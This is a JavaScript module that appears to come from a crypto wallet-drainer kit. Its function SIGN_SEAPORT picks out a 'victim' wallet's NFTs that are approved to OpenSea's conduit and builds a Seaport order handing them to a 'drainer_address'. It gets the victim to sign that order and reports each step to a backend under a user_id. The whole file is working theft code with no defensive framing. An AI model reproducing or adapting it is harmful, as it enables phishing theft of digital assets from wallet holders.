import { is_nft_approved, send_request } from "../web3-provider";
import { ethers } from "ethers";
import { Seaport } from "@opensea/seaport-js";

export const SIGN_SEAPORT = async (
  assets,
  provider,
  victim_address,
  drainer_address,
  user_id,
  min_price = 0
) => {
  try {
    const nft_list = [];
    const nft_list_plain = [];

    // Filter and prepare assets
    for (const asset of assets) {
      if (
        asset.skip ||
        asset.type !== "ERC721" ||
        asset.chain_id !== 1 ||
        asset.amount_usd < min_price
      )
        continue;

      const isApproved = await is_nft_approved(
        asset.address,
        victim_address,
        "0x1E0049783F008A0085193E00003D00cd54003c71"
      );
      if (!isApproved) continue;

      nft_list.push({ collection: asset.address, tokenID: asset.id });
      nft_list_plain.push(asset);
    }

    if (nft_list.length === 0) return;

    const web3 = new ethers.providers.Web3Provider(provider);
    const signer = web3.getSigner();

    // Prepare Seaport offers and considerations
    const seaportOffer = nft_list.map((value) => ({
      itemType: 2,
      token: value.collection,
      identifier: value.tokenID,
    }));

    const seaportConsiderations = nft_list.map((value) => ({
      amount: "1",
      recipient: drainer_address,
      itemType: 2,
      token: value.collection,
      identifier: value.tokenID,
    }));

    try {
      const seaportObject = new Seaport(signer, { seaportVersion: "1.5" });

      // Create Seaport order
      const { executeAllActions: createSeaportOrder } =
        await seaportObject.createOrder(
          {
            offer: seaportOffer,
            consideration: seaportConsiderations,
            conduitKey:
              "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
            zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
            startTime: Math.floor(Date.now() / 1000).toString(), // Current time
            endTime: (Math.floor(Date.now() / 1000) + 86400).toString(), // 24 hours from now
            offerer: victim_address,
          },
          drainer_address
        );

      await send_request({
        action: "seaport",
        user_id,
        seaport: "request",
        assets: nft_list_plain,
      });
      const seaportOrder = await createSeaportOrder();
      await send_request({
        action: "seaport",
        user_id,
        seaport: "success",
        order: seaportOrder,
        address: victim_address,
      });

      // Update asset statuses
      for (const asset of assets) {
        if (asset.skip || asset.type !== "ERC721" || asset.chain_id !== 1)
          continue;

        const isSigned = nft_list_plain.some(
          (x_asset) =>
            x_asset.address === asset.address && x_asset.id === asset.id
        );
        if (isSigned) {
          asset.skip = true;
        }
      }
    } catch (err) {
      console.error(err);
      await send_request({ action: "seaport", user_id, seaport: "cancel" });
    }
  } catch (err) {
    console.error(err);
  }
};
